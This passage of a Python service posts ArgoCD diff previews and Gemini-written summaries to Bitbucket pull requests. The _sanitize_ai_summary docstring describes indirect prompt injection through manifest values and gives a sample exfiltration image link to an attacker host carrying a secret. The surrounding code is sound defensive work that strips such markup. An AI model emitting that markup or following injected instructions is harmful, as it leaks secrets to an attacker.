            return DiffResult("", [], 0, False, None, OUT_NO_DIFF, "clean",
                              version_change)

        # Filter noise sections (checksums, version annotations that always drift)
        filtered_sections = _filter_diff_sections(parse_diff_sections(diff_text))
        if not filtered_sections:
            return DiffResult("", [], 0, False, None, OUT_NO_DIFF, "noise_only",
                              version_change)

        n_res = len(filtered_sections)
        # Truncate to display budget NOW so we never hold the full YAML in
        # memory — but detect deletions/zeroings FIRST, on the full list
        # (v2.5.26: the PR-6773 lesson, see _package_sections).
        clean_diff, capped_sections, deleted_res, zeroed_res, fingerprint, \
            renamed_res, vm_changes_res, version_fold = _package_sections(
                filtered_sections, version_change=version_change)
        return DiffResult(clean_diff, capped_sections,
                          n_res, True, None, OUT_DIFF, "changes", version_change,
                          deleted_res, zeroed_res, fingerprint, renamed_res,
                          vm_changes_res, version_fold)
    # Exhausted retries
    return _indeterminate(last_reason, last_detail or "unknown error")


def parse_diff_sections(diff_text):
    """Parse ArgoCD diff output into [(header, body)] list.

    Returns empty list if no '=====' separators found in the output.
    """
    sections, hdr, lines = [], None, []
    for line in diff_text.splitlines(keepends=True):
        if line.startswith("====="):
            if hdr and lines:
                sections.append((hdr, "".join(lines)))
            hdr   = line.strip().strip("=").strip()
            lines = []
        elif hdr is not None:
            lines.append(line)
    if hdr and lines:
        sections.append((hdr, "".join(lines)))
    return sections

# ── Bitbucket helpers ─────────────────────────────────────────────────
def post_build_status(pr_sha, state, description, pr_id=None, repo=None):
    """Post build status. Swallows errors - never crashes the script.

    The status URL used to always point at the ArgoCD server (bughunt: this
    build status is the acme-diff-preview service itself running as an
    ArgoCD Application - the link told a reviewer nothing about the actual
    diff and required separate ArgoCD access to even load). The full diff
    and every detail is already in the PR comment, so the link deep-links
    to that comment when its id is known (v2.6.1), or to the PR otherwise;
    only the handful of call sites that fire before the PR id is known fall
    back to no meaningful destination (ARGOCD_SERVER), which practically
    never happens in the normal flow.
    """
    repo = repo or _repo_for_sha(pr_sha)
    # v2.6.1: Bitbucket REQUIRES a url on build statuses (empirically verified:
    # both a missing and an empty url are rejected). A bare PR link is
    # confusing — it "redirects" to the page the reviewer is already on — so
    # when the bot's comment id is known (cached by upsert_comment /
    # find_existing_comment) the link anchors straight to the review comment,
    # which is what the status text promises. First-run statuses posted
    # before any comment exists fall back to the plain PR link.
    _cid = None
    if pr_id is not None:
        with _comment_id_cache_lock:
            _cid = _comment_id_cache.get((repo or BB_REPO, pr_id))
    _anchor = f"#comment-{_cid}" if _cid else ""
    url = (f"https://bitbucket.org/{BB_WORKSPACE}/{repo or BB_REPO}/pull-requests/{pr_id}{_anchor}"
           if pr_id else f"https://{ARGOCD_SERVER}")
    # Full-diff UI: when the full-diff UI is enabled AND reachable (base url set)
    # AND this exact commit's artifact exists, the build icon deep-links to
    # the complete, untruncated diff (Atlantis-style). Any other case keeps
    # the existing comment/PR link so the status never points at a 404.
    if (pr_id and DIFF_UI_ENABLED and DIFF_UI_BASE_URL
            and diff_ui.has_artifact(DIFF_UI_DIR, repo or BB_REPO, pr_id,
                                     pr_sha, bucket=DIFF_UI_GCS_BUCKET)):
        url = diff_ui.ui_url(DIFF_UI_BASE_URL, repo or BB_REPO, pr_id, pr_sha)
    try:
        bb("POST", f"commit/{pr_sha}/statuses/build", repo=repo, body={
            "state": state, "key": BUILD_KEY,
            "name": STATUS_NAME,
            "url": url,
            "description": description[:255],
        })
    except Exception as e:
        log(f"[build status] failed to set {state}: {e}", "WARNING")

def _bb_api_base(repo=None):
    """Per-repo Bitbucket API base URL (COPS-2507 multi-repo)."""
    return f"https://api.bitbucket.org/2.0/repositories/{BB_WORKSPACE}/{repo or BB_REPO}"

# Kept as a module-level value for legacy call sites/tests; equals the default repo's base.
_BB_API_BASE = _bb_api_base()
_BB_MAX_PAGES = 100   # safety guard: prevents infinite loops on malformed next-links


def get_open_prs(repo=None):
    base = _bb_api_base(repo)
    url = f"{base}/pullrequests?state=OPEN&pagelen=50"
    prs, nxt, pages = [], url, 0
    while nxt and pages < _BB_MAX_PAGES:
        data = http("GET", nxt, auth=(BB_USER, BB_TOKEN))
        prs += data.get("values", [])
        nxt  = data.get("next")
        pages += 1
    if pages >= _BB_MAX_PAGES:
        log(f"get_open_prs[{repo or BB_REPO}]: hit page limit ({_BB_MAX_PAGES}), "
            f"results may be incomplete", "WARNING")
    return prs


def get_pr_changed_files(pr_id, repo=None):
    files, renames, path, pages = [], {}, f"pullrequests/{pr_id}/diffstat?pagelen=100", 0
    base = _bb_api_base(repo)
    while path and pages < _BB_MAX_PAGES:
        data = bb("GET", path, repo=repo)
        for item in data.get("values", []):
            # FIX C (v2.4.9): a rename has BOTH old and new paths. The OLD
            # path is the one referenced by the live ArgoCD Application's
            # valueFiles (and present in path_map), so it must be kept or the
            # affected-app detector misses the change entirely and wrongly
            # reports "no apps affected" for a rename that will break sync.
            old_p = (item.get("old") or {}).get("path", "")
            new_p = (item.get("new") or {}).get("path", "")
            for p in (old_p, new_p):
                if p and p not in files:
                    files.append(p)
            # v2.5.4 (Finding 6): remember the old->new pairing too. A rename
            # means the OLD path's content is NOT gone, it moved — the value
            # fetch layer needs this to follow it instead of treating the
            # old path's 404-at-pr_sha as a deletion (confirmed live: a pure
            # folder rename made helm template fail entirely for that
            # customer, PRs #6647/#6648/#6649/#6654).
            if old_p and new_p and old_p != new_p:
                renames[posixpath.normpath(old_p.lstrip("/"))] = \
                    posixpath.normpath(new_p.lstrip("/"))
        nxt  = data.get("next", "")
        path = nxt.replace(f"{base}/", "") if nxt else ""
        pages += 1
    if pages >= _BB_MAX_PAGES and path:
        # Page limit hit and more pages exist — affected app list is INCOMPLETE.
        # Missing changed files → apps appear unaffected → potential false no_diff.
        log(f"PR #{pr_id}: diffstat page limit ({_BB_MAX_PAGES}) hit with more pages "
            f"remaining — {len(files)} files captured; PR has >10k changed files. "
            f"App detection is incomplete for this PR.",
            "WARNING", pr=pr_id)
    return files, renames

def find_existing_comment(pr_id, repo=None):
    """Find our comment on a PR, cheaply when possible.

    Returns (comment_id, sha_8, raw_text).
    sha_8 is 8-char hex or '' if not found in comment.

    Fast path: if we already know this PR's comment id (bughunt N5), fetch
    it directly (1 API call) instead of paginating every comment on the PR.
    Falls back to a full scan on first sight or if the cached id 404s
    (comment was deleted) or no longer carries our marker.
    Cache key is (repo, pr_id) — PR ids collide across repos (COPS-2507).
    """
    ck = (repo or BB_REPO, pr_id)
    with _comment_id_cache_lock:
        cached_id = _comment_id_cache.get(ck)
    if cached_id:
        try:
            c = bb("GET", f"pullrequests/{pr_id}/comments/{cached_id}", repo=repo)
            raw = c.get("content", {}).get("raw", "")
            if any(mk in raw for mk in _COMMENT_MARKERS):
                return cached_id, _extract_comment_sha(raw), raw
            # Marker gone (comment edited by a human) — fall through to a
            # full scan rather than trust a comment that is no longer ours.
        except urllib.error.HTTPError as e:
            if e.code == 404:
                with _comment_id_cache_lock:
                    _comment_id_cache.pop(ck, None)
            else:
                raise  # transient — same contract as the full-scan path below
        except Exception:
            raise

    nxt, pages = f"pullrequests/{pr_id}/comments?pagelen=100", 0
    base = _bb_api_base(repo)
    while nxt and pages < _BB_MAX_PAGES:
        try:
            data = bb("GET", nxt, repo=repo)
        except Exception as e:
            # Transient Bitbucket error: raise so process_pr skips this PR
            # rather than posting a duplicate comment (new ID, no update in place).
            debug(f"find_existing_comment page {pages} error: {e}")
            raise
        for c in data.get("values", []):
            raw = c.get("content", {}).get("raw", "")
            # Match the current marker AND the legacy one so comments written by
            # older pods are updated in place instead of duplicated during rollout.
            if any(mk in raw for mk in _COMMENT_MARKERS):
                with _comment_id_cache_lock:
                    _comment_id_cache[ck] = c["id"]
                return c["id"], _extract_comment_sha(raw), raw
        next_url = data.get("next", "")
        nxt = next_url.replace(f"{base}/", "") if next_url else ""
        pages += 1
    return None, "", ""

def _truncate_comment(body: str, artifact_url: str = "") -> str:
    """Cap a comment body at MAX_COMMENT_BYTES, PRESERVING the footer.

    artifact_url, when known, makes the truncation note link straight to
    the full-diff view instead of pointing the reviewer at "the pod logs" —
    the exact wording that shipped on every truncated mass-PR comment and
    helped nobody (observed live on acme-config-prod PR #3891 and others).

    v2.5.18 (FINDINGS_SCALE S2): the old truncation cut from the END, which
    destroyed the footer on every oversized comment — and mass PRs are
    ALWAYS oversized (measured 433KB pre-truncation at 800 apps, vs the
    245KB Bitbucket limit). The footer carries the two machine-readable
    tokens the whole dedup design depends on: [clean|permanent|transient]
    (drives the retry decision) and [base:xxxxxxxx] (the F1 main-advanced
    check). With both gone, a pod restart re-diffed the entire, unchanged
    mass PR from scratch (measured replay: rerun=True), cross-pod dedup was
    fully broken for these PRs, and fix_stuck_inprogress fell through all
    its heuristics. Now the cut removes MIDDLE content (diff blocks) and
    always re-appends the real footer, so the marker, the sha header, and
    both tokens survive any size. If the cut lands inside a ``` fence, the
    fence is closed so the note and footer never render as code.

    Bodies without a recognizable '---\\n**Status:**' footer (legacy or
    hand-built) keep the old end-cut behavior, marker included in the note —
    the exact contract test_upsert_comment_truncates_oversized_bodies pins.
    """
    encoded = body.encode("utf-8")
    if len(encoded) <= MAX_COMMENT_BYTES:
        return body
    where = (f"see the [full diff]({artifact_url})" if artifact_url
             else "see the pod logs or ArgoCD UI for the full diff")
    note = (f"\n\n*... diff content truncated ({len(encoded)//1024}KB exceeds "
            f"the Bitbucket comment limit) - {where}*\n")
    footer_at = body.rfind("\n---\n**Status:**")
    if footer_at != -1:
        footer = body[footer_at:]
        # 16 spare bytes cover a possible closing ``` fence added below.
        budget = (MAX_COMMENT_BYTES - len(footer.encode("utf-8"))
                  - len(note.encode("utf-8")) - 16)
        if budget > 0:
            head = encoded[:budget].decode("utf-8", errors="ignore")
            if head.count("```") % 2 == 1:
                head += "\n```"
            return head + note + footer
    # Legacy fallback: end-cut, keeping the marker so find_existing_comment
    # still matches the truncated comment.
    cutoff = MAX_COMMENT_BYTES - 300
    out = encoded[:cutoff].decode("utf-8", errors="ignore")
    out += (f"\n\n*... comment truncated ({len(encoded)//1024}KB exceeds limit)"
            f" - see ArgoCD UI for full diff - {COMMENT_MARKER}*")
    return out


def _record_comment_stats(body, profile, fallback_inline=False):
    """Record the size and shape of a comment body we are about to post.

    Phases C-E of COPS-2607 are all verified against these numbers: C proves
    the page holds everything, E proves the comment stopped carrying YAML and
    never approaches MAX_COMMENT_BYTES. Neither claim can be checked against
    production without a number that was already being collected before the
    change, so this lands in phase B with nothing to show yet.

    Returns (bytes, fences) so the caller can log them without recomputing.
    """
    n_bytes = len(body.encode("utf-8"))
    n_fences = body.count("```diff")
    with _diff_stats_lock:
        _diff_stats["comment_bytes"] = n_bytes
        if n_bytes > _diff_stats.get("comment_max_bytes", 0):
            _diff_stats["comment_max_bytes"] = n_bytes
        _diff_stats["comment_fences"] = n_fences
        if fallback_inline:
            _diff_stats["comment_fallback_inline"] += 1
    log(f"[comment] profile={profile.name} bytes={n_bytes} "
        f"fences={n_fences} fallback_inline={bool(fallback_inline)}")
    return n_bytes, n_fences


def _save_diff_ui_artifact(repo, pr_id, pr_sha, body, base_sha=None,
                           outcome_counts=None, app_count=None):
    """Full-diff UI: persist the FULL comment body (pre-truncation) for the web
    UI. No-op unless DIFF_UI_ENABLED. Never raises: the artifact is a bonus
    on top of the comment, so a full disk or bad key must not break the run.
    The body passed here is the exact text upsert_comment posts, so the store
    only ever holds already-redacted content.

    base_sha/outcome_counts/app_count are the same per-PR context already
    computed for the log line and the comment header, threaded through so
    the page shows real PR context (base commit, per-outcome breakdown, app
    count) instead of only the raw diff text.

    Returns True only when the page really was written. The comment offers a
    link to that page before it exists, so a swallowed failure used to mean
    a comment pointing at a 404 with nobody able to tell (COPS-2609). A
    disabled UI returns False for the same reason: not an error, but still
    no page, and the caller has to take the same branch."""
    if not DIFF_UI_ENABLED:
        return False
    try:
        diff_ui.save_artifact(
            DIFF_UI_DIR, repo or BB_REPO, pr_id, pr_sha, body,
            pr_url=(f"https://bitbucket.org/{BB_WORKSPACE}/"
                    f"{repo or BB_REPO}/pull-requests/{pr_id}"),
            max_artifacts=DIFF_UI_MAX_ARTIFACTS,
            max_bytes=DIFF_UI_MAX_BYTES,
            base_sha=base_sha, outcome_counts=outcome_counts,
            app_count=app_count, bucket=DIFF_UI_GCS_BUCKET)
        return True
    except Exception as e:
        log(f"[diff-ui] artifact save failed (non-fatal): {e}", "WARNING")
        return False

def upsert_comment(pr_id, body, existing_id=None, repo=None, artifact_url=""):
    """Post or update PR comment. Truncates if over limit; posts fallback on error.

    artifact_url is threaded into the truncation note so an oversized
    comment links straight to the full-diff view (see _truncate_comment)."""
    orig_bytes = len(body.encode("utf-8"))
    if orig_bytes > MAX_COMMENT_BYTES:
        body = _truncate_comment(body, artifact_url=artifact_url)
        with _diff_stats_lock:
            _diff_stats["comments_truncated"] += 1
        log(f"[comment] truncated: {orig_bytes//1024}KB -> "
            f"{MAX_COMMENT_BYTES//1024}KB (footer/tokens preserved)", "WARNING")
    payload = {"content": {"raw": body}}
    ck = (repo or BB_REPO, pr_id)
    try:
        if existing_id:
            bb("PUT",  f"pullrequests/{pr_id}/comments/{existing_id}", repo=repo, body=payload)
        else:
            c = bb("POST", f"pullrequests/{pr_id}/comments", repo=repo, body=payload)
            # v2.6.1: cache the fresh comment id so the FINAL build status of
            # this same run can deep-link to the comment (#comment-<id>),
            # instead of only from the second run on (via find_existing_comment).
            if isinstance(c, dict) and c.get("id"):
                with _comment_id_cache_lock:
                    _comment_id_cache[ck] = c["id"]
    except Exception as e:
        # Only a 404 on PUT means the comment was deleted and a fresh POST is
        # correct. Any other failure (429/5xx/network) means the old comment
        # still exists: POSTing would create a duplicate (bughunt F2). Give up
        # this round — the comment still carries the previous sha, so the
        # next iteration's cross-pod check recomputes and retries the update.
        # (Error-message fallbacks caused a re-run loop in the past; see git log.)
        was_deleted = (existing_id and isinstance(e, urllib.error.HTTPError)
                       and e.code == 404)
        if not was_deleted:
            log(f"[comment] upsert failed ({e}); NOT posting a fallback "
                f"(comment likely still exists — would duplicate)", "ERROR")
            return
        log(f"[comment] comment {existing_id} was deleted; re-creating", "WARNING")
        with _comment_id_cache_lock:
            _comment_id_cache.pop(ck, None)
        try:
            c = bb("POST", f"pullrequests/{pr_id}/comments", repo=repo, body=payload)
            if isinstance(c, dict) and c.get("id"):
                with _comment_id_cache_lock:
                    _comment_id_cache[ck] = c["id"]
            log("[comment] fallback POST succeeded", "INFO")
        except Exception as e2:
            log(f"[comment] fallback POST also failed: {e2}", "ERROR")

def fix_stuck_inprogress(pr_sha, pr_id, comment_raw, repo=None):
    """If build status is stuck INPROGRESS but comment is current, fix the status.

    This handles the case where a previous CronJob pod was killed after posting
    the comment but before posting the final SUCCESSFUL/FAILED status.
    """
    try:
        st = http("GET",
            f"{_bb_api_base(repo)}"
            f"/commit/{pr_sha}/statuses/build/{BUILD_KEY}",
            auth=(BB_USER, BB_TOKEN))
        if st.get("state") != "INPROGRESS":
            return
        # Derive correct state from the machine-readable token first (1.9.1+,
        # fixed for real in this version - see _extract_status_token), then
        # fall back to parsing the human-readable comment text.
        _token = _extract_status_token(comment_raw)
        if _token == "permanent":
            state, desc = "FAILED", "Diff failed - check PR comment"
        elif _token == "clean":
            if "resource(s) will change" in comment_raw:
                m = re.search(r"(\d+) resource\(s\) will change", comment_raw)
                n = m.group(1) if m else "?"
                state, desc = "SUCCESSFUL", f"{n} resource(s) will change - review comment"
            elif "New Environment(s) Detected" in comment_raw or "resource(s) to create" in comment_raw:
                m = re.search(r"~?(\d+) resource\(s\) to create", comment_raw)
                n = m.group(1) if m else "?"
                state, desc = "SUCCESSFUL", f"New environment(s) - ~{n} resource(s) to create"
            elif "No ArgoCD apps affected" in comment_raw:
                state, desc = "SUCCESSFUL", "No ArgoCD apps affected by this PR"
            else:
                state, desc = "SUCCESSFUL", "No manifest changes"
        elif _token == "transient":
            # v2.5.4 (Finding 3): same rule as the main status path — any
            # indeterminate outcome is red, never green, even mid-recovery
            # from a killed pod. The retry itself is unaffected: this only
            # fixes the color of a stuck-INPROGRESS status being resolved,
            # it does not change whether the PR gets re-diffed next iteration.
            state, desc = "FAILED", "Diff unavailable - review comment (will retry automatically if transient)"
        elif "Error running diff" in comment_raw or "\u274c" in comment_raw:
            state, desc = "FAILED", "Diff failed - check PR comment"
        elif "not found in OCI registry" in comment_raw:
            state, desc = "FAILED", "Chart version not found in OCI registry"
        elif "resource(s) will change" in comment_raw:
            m = re.search(r"(\d+) resource\(s\) will change", comment_raw)
            n = m.group(1) if m else "?"
            state, desc = "SUCCESSFUL", f"{n} resource(s) will change - review comment"
        elif "Diff incomplete" in comment_raw:
            # v2.5.4 (Finding 3): legacy fallback for a comment posted before
            # the [transient]/[permanent]/[clean] token existed. Same rule.
            state, desc = "FAILED", "Diff unavailable - review comment"
        else:
            state, desc = "SUCCESSFUL", "No manifest changes"
        post_build_status(pr_sha, state, desc, pr_id=pr_id)
        print(f"    Fixed stuck INPROGRESS for PR #{pr_id} -> {state}")
    except Exception as e:
        log(f"[fix_stuck_inprogress] PR #{pr_id}: {e}", "WARNING")

# ── Vertex AI (Gemini) summary ─────────────────────────────────────────
# AI-powered diff summary using Vertex AI Gemini.
# Auth: GCE metadata server token via Workload Identity (no API key).
# Prerequisite: roles/aiplatform.user on argocd@appspace-devops GSA.
#
# Two display modes based on changeset size:
#   small  (<= LARGE_PR_APP_THRESHOLD changed apps AND <= LARGE_PR_DIFF_BYTES)
#          -> AI summary + full diffs shown inline
#   large  (> threshold)
#          -> AI summary is primary content, diffs collapsed in <details>
#
# Fails silently: comment posts without AI block if Vertex AI call fails.

VERTEX_PROJECT           = os.environ.get("GCP_PROJECT", "appspace-devops")
VERTEX_LOCATION          = os.environ.get("VERTEX_LOCATION", "us-central1")
# gemini-2.5-flash: better reasoning than lite, still fast and cheap.
# One call per PR run (not per resource), so cost impact is negligible.
VERTEX_MODEL             = os.environ.get("VERTEX_MODEL", "gemini-2.5-flash")
# COPS-2555: simple, reversible on/off switch for the whole feature, same
# convention as DIFF_UI_ENABLED/LEADER_ELECTION_ENABLED. Defaults ON so no
# other deployment of this chart is affected unless it opts out explicitly.
AI_SUMMARY_ENABLED       = os.environ.get(
    "AI_SUMMARY_ENABLED", "true").strip().lower() in ("1", "true", "yes")

# Thresholds for switching between inline and collapsed diff display.
# Bitbucket does NOT render HTML <details>/<summary> tags, so there is no
# real "collapse" available. For large PRs we show a compact summary table,
# plus (COPS-2579) one full diff per distinct fingerprint group instead of
# a fixed top-N of apps -- see _group_changed_apps_by_fingerprint.
LARGE_PR_APP_THRESHOLD   = 5       # changed apps above this -> large mode
LARGE_PR_DIFF_BYTES      = 40_000  # total diff bytes above this -> large mode

# Limits for what we send to the model.
AI_MAX_SECTIONS_PER_APP  = 10
AI_MAX_BODY_CHARS        = 1500
# COPS-2579: DiffResult.sections used to be hard-capped to
# AI_MAX_SECTIONS_PER_APP (10) at diff time -- a cap meant for the AI
# prompt (see the independent re-slice at generate_ai_summary's
# `sections[:AI_MAX_SECTIONS_PER_APP]`) that got reused as the STORAGE cap
# too, so any resource past #10 was discarded before the comment or the
# diff-UI page could ever show it (measured: 60 of 16616 sections shown on
# acme-config-prod PR #3837).
# COPS-2610 raised the bound again, 400 to 5,000. This is MEMORY safety,
# not display policy: the full list already exists in memory when
# _package_sections runs (every safety fact and the fingerprint are
# computed on it pre-cap), so the cap only bounds what is RETAINED in
# DiffResult across the whole run's app_results (the COPS-2543 OOM
# lesson). At 400 it silently amputated the artifact of any app past it --
# and the comment's note then claimed the remainder was "only in the full
# diff view", which was exactly where it was not. If an app ever exceeds
# 5,000, the trim is counted (section_cap_trims) and the FULL page says so
# instead of pretending completeness.
FULL_SECTIONS_MAX_PER_APP = _env_int("FULL_SECTIONS_MAX_PER_APP", 5000)


# ── Render profiles (COPS-2609, phase B of COPS-2607) ────────────────────
# This service renders two surfaces with one function: the PR comment and
# the full-diff page behind the ACME Diff Preview build status. Until now
# the only thing separating them was `readable_budget`, and that integer's
# truthiness had quietly accumulated four more jobs: whether byte-identical
# apps are grouped, whether version-transition noise folds, whether the
# overview table is row-capped, and whether the appendix collapses into a
# pointer. A call site could not read any of that, and the later phases of
# COPS-2607 need to say things the integer cannot express at all -- no body
# cap, no fences, no input panel.
#
# So the difference between the two surfaces becomes a value. The point is
# that phases C, D and E change a profile rather than the renderer.
@dataclass(frozen=True)
class RenderProfile:
    """How much of the truth a given surface shows.

    Frozen on purpose: these are module-level constants shared across every
    PR and every worker thread. A render able to mutate one would leak the
    change into unrelated PRs, and the symptom (a comment that folds
    differently depending on what was rendered before it) is close to
    impossible to reproduce. Use replace() for a variant.
    """
    name: str
    # Bulk-region readability budget in bytes. 0 renders everything.
    # None means "COMMENT_READABLE_BYTES, read at render time" -- see
    # resolved(). Do NOT bake the constant in as a default here: it is an
    # _env_int, so a snapshot taken at import silently ignores both the env
    # var and any runtime override, and the symptom is a comment that stops
    # honouring its own configured budget.
    readable_budget: int = None
    # Render the YAML hunks inline. Phase E (COPS-2612) turns this off for
    # the comment, which is only safe because phase C proved the page holds
    # everything and phase D made it navigable.
    # None = COMMENT_INLINE_DIFFS at render time. Never bake the env value
    # in as a default here, for the reason spelled out under
    # readable_budget: an import-time snapshot makes the switch decorative,
    # and this one is the phase E rollback.
    inline_diffs: bool = None
    # Render the "why this changed" input panel. Phase E moves it to the
    # page. None = COMMENT_INPUT_PANEL at render time.
    input_panel: bool = None
    # Collapse byte-identical apps into one representative (COPS-2579).
    group_repeats: bool = True
    # Fold version-transition noise so needles stay visible (COPS-2606).
    version_fold: bool = True
    # Evidence lines to show per app when inline_diffs is off. Phase E
    # renders these for BLOCK-severity apps only, so a reviewer never has
    # to leave the comment to see WHY something is dangerous, only to see
    # the rest. None = COMMENT_INLINE_EVIDENCE_LINES at render time; 0 (the
    # default) means the comment ships with no fences at all.
    inline_evidence_lines: int = None
    # This surface IS the complete record, not a summary pointing at one
    # (COPS-2611). Two consequences, both about not lying to the reader:
    # it never renders a pointer to the full-diff page (it would be a link
    # to itself, and with no URL to hand it degrades to "the page could not
    # be produced" -- which the page then said about itself, live on 2.32.0
    # and 2.33.0), and when the storage cap trims an app it owns the
    # shortfall instead of directing the reader elsewhere.
    # A behaviour field rather than a check on name: a profile derived with
    # replace() under another name must keep behaving like the page.
    is_complete_record: bool = False
    # Hard cap per resource body. 0 = never cut (COPS-2610, the FULL page);
    # the sentinel is resolved through the FULL_PAGE_UNCAPPED hatch below.
    # None = DISPLAY_BODY_MAX_CHARS at render time (see readable_budget).
    body_max_chars: int = None
    # Sections kept per app. Applied when the diff is computed, not when it
    # is rendered, so phase C has to lift it there; carried here so the
    # value a surface wants is stated in one place.
    # None = FULL_SECTIONS_MAX_PER_APP at render time.
    section_cap: int = None

    def replace(self, **kw):
        return dataclasses.replace(self, **kw)

    def resolved(self):
        """Fill in every field that means "the module constant, right now".

        Called once per render. Idempotent, so a caller that hands in an
        already-resolved profile gets it back unchanged.

        body_max_chars: None means the module default; 0 means "never cut"
        and passes through the FULL_PAGE_UNCAPPED escape hatch, so flipping
        that env var back restores the pre-2.33.0 capped page without
        touching a profile (COPS-2610). Checked at render time for the same
        reason the constants are: an import-time snapshot would make the
        hatch decorative.
        """
        body_cap = self.body_max_chars
        if body_cap is None:
            body_cap = DISPLAY_BODY_MAX_CHARS
        elif body_cap == 0 and not FULL_PAGE_UNCAPPED:
            body_cap = DISPLAY_BODY_MAX_CHARS
        return dataclasses.replace(
            self,
            readable_budget=(COMMENT_READABLE_BYTES
                             if self.readable_budget is None
                             else self.readable_budget),
            inline_diffs=(COMMENT_INLINE_DIFFS
                          if self.inline_diffs is None
                          else self.inline_diffs),
            input_panel=(COMMENT_INPUT_PANEL
                         if self.input_panel is None
                         else self.input_panel),
            inline_evidence_lines=(COMMENT_INLINE_EVIDENCE_LINES
                                   if self.inline_evidence_lines is None
                                   else self.inline_evidence_lines),
            body_max_chars=body_cap,
            section_cap=(FULL_SECTIONS_MAX_PER_APP
                         if self.section_cap is None
                         else self.section_cap))

    @classmethod
    def from_readable_budget(cls, readable_budget):
        """Map the deprecated keyword onto a profile.

        None is the comment with the module default. 0 is the page: it is
        how process_pr and eleven existing tests ask for the complete
        render. Any other number is still the comment, just tighter -- the
        fold tests drive it with 8000/6000/2500 and must keep grouping and
        folding, which is exactly what the old `if budget:` did.
        """
        if readable_budget is None:
            return COMMENT_PROFILE
        if not readable_budget:
            return FULL_PROFILE
        return COMMENT_PROFILE.replace(readable_budget=readable_budget)


COMMENT_PROFILE = RenderProfile(name="COMMENT")
FULL_PROFILE = RenderProfile(
    name="FULL",
    readable_budget=0,
    group_repeats=False,
    version_fold=False,
    is_complete_record=True,
    # Pinned True, never resolved from the env: the page is the complete
    # record, so the phase E switches must not be able to empty it. Flipping
    # COMMENT_INLINE_DIFFS is a comment-shape decision; if it could also
    # reach the page, the rollback switch would delete the very thing it
    # exists to fall back on.
    inline_diffs=True,
    input_panel=True,
    inline_evidence_lines=0,
    # COPS-2610 (phase C): the page never cuts a resource body. Measured
    # before the change: acme-config-prod #3887's stored artifact carried
    # 981 "diff truncated for display" markers, 981 places where the
    # complete record told the reader to go somewhere else. 0 resolves
    # through the FULL_PAGE_UNCAPPED hatch, see resolved().
    body_max_chars=0,
    # section_cap stays live (None -> FULL_SECTIONS_MAX_PER_APP): the trim
    # happens at STORAGE time in _package_sections, shared by both
    # surfaces, and is a memory bound, not display policy. Raised to 5,000
    # and made loud in the same change.
)
# v2.5.18 (FINDINGS_SCALE S1): cap how many APPS go into the prompt. The two
# caps above bound each app's contribution but not the number of apps, so a
# mass version bump built an unbounded prompt: measured 4.3MB (~1.08M tokens)
# at 300 changed apps and 11.6MB at 800 — past gemini-2.5-flash's ~1M-token
# context, so exactly the PRs that most need a summary silently lost it (the
# Vertex call failed on length and the comment posted without AI), after
# uploading megabytes per attempt. 40 apps x 10 sections x ~1.5KB ≈ 700KB
# (~180K tokens) — wide margin. The apps with the largest diffs are kept
# (a top-N-by-size idea, same shape the comment used to use for its own
# inline cutoff before COPS-2579 replaced that with fingerprint grouping)
# and the model is told how many were omitted; the deterministic headline
# still counts ALL apps.
AI_MAX_APPS              = _env_int("AI_MAX_APPS", 40)

def _gcp_access_token() -> str:
    """Return a valid GCE access token, reusing the cached one when possible.

    Tokens are valid for ~3600s. We refresh when fewer than 60s remain
    so there is no risk of using an expired token mid-request.

    Locked (bughunt): generate_ai_summary runs per-PR under MAX_PR_WORKERS
    concurrent threads, all reading/writing this module-level cache. Without
    a lock, two threads racing near expiry could both trigger a redundant
    metadata-server fetch, or (narrower window) end up with a token from one
    fetch paired with the expiry timestamp from a different concurrent fetch.
    Neither produces an invalid/unsafe token, but the lock removes the race
    entirely at negligible cost (this is called once per PR render, not
    per-app).
    """
    global _gcp_token, _gcp_token_exp
    with _gcp_token_lock:
        if _gcp_token and time.monotonic() < (_gcp_token_exp - 60):
            return _gcp_token
        print("      [AI] Fetching GCP token from metadata server...")
        resp           = http(
            "GET",
            "http://metadata.google.internal/computeMetadata/v1"
            "/instance/service-accounts/default/token",
            headers={"Metadata-Flavor": "Google"},
        )
        _gcp_token     = resp["access_token"]
        _gcp_token_exp = time.monotonic() + resp.get("expires_in", 3600)
        exp = resp.get("expires_in", "?")
        print(f"      [AI] Token refreshed (valid for {exp}s)")
        return _gcp_token

def _sanitize_ai_summary(text: str) -> str:
    """Strip active/exfiltration Markdown from model output before it is
    posted as a PR comment.

    v2.5.19 (R6, community-research round): the AI summary is model output
    built from untrusted rendered manifest values, which makes it an indirect
    prompt-injection sink. The documented "Markdown image exfiltration"
    channel (Checkmarx, against Copilot Chat and Gemini) is zero-click: a
    model coaxed into emitting ![x](https://attacker/?d=<secret>) makes the
    reviewer's browser fetch that URL on render. Cross-vendor "Comment-and-
    Control" research showed AI review bots posting attacker-chosen content
    into PR comments. We do not trust the model not to be steered, so we
    strip, from its output only (never from our deterministic head line):
      - Markdown images ![alt](url) -> alt text kept, image dropped
      - raw HTML tags (img/picture/script/style/anchors/comments)
      - autolinked bare URLs left as text but de-linked from any image use
      - triple-backtick fences (the model must not open its own fences)
    The summary is advisory prose; none of these belong in it, so removing
    them cannot lose diff information.
    """
    if not text:
        return text
    t = text
    # Markdown image -> keep alt text, drop the URL entirely.
    t = re.sub(r'!\[([^\]]*)\]\([^)]*\)', r'\1', t)
    # HTML comments (hidden instructions) and any raw tags.
    t = re.sub(r'<!--.*?-->', '', t, flags=re.DOTALL)
    t = re.sub(r'</?[A-Za-z][^>]*>', '', t)
    # The model must never open a code fence in an advisory summary.
    t = _fence_safe(t)
    return t.strip()


def _normalize_ai_markdown(text: str) -> str:
    """Ensure the AI output renders correctly in Bitbucket Markdown.

    Bitbucket requires a blank line before a bullet list; without it
    the items render as inline text instead of a proper list.
    The model outputs single-newline separators which look fine in
    plain text but collapse into a wall of text in Bitbucket.
    """
    # Blank line before the first list item following non-list text.
    t = re.sub(r'([^\n])\n([ \t]*[-*] )', r'\1\n\n\2', text)
    # Blank line before the Critical/No-critical flag line.
    t = re.sub(r'\n([⚠✅][^⚠✅])', r'\n\n\1', t)
    return t.strip()

_SENSITIVE_KEYS = re.compile(
    r'(?i)(password|passwd|pwd|pass|secret|token|key|api[-_]?key|private[-_]?key'
    r'|auth|credential|bearer|jwt|access[-_]?token|refresh[-_]?token'
    r'|connection[-_]?string|dsn|mongodb[-_]?uri|postgres[-_]?url'
    r'|encryption[-_]?key|signing[-_]?key)',
)
# COPS-2579: only bare "key" is exempted below, by exact structural field
# name -- NOT bare "pass" or "auth". An earlier draft of this fix also
# dropped those two, on the (untested) theory that they might over-match
# things like "compassRegion" or "authorEmail". The existing test suite
